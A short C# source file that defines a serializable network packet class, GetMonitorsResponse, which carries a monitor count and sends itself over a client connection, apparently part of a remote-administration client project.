using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetMonitorsResponse : IPacket
    {
        public int Number { get; set; }

        public GetMonitorsResponse()
        {
        }

        public GetMonitorsResponse(int number)
        {
            this.Number = number;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}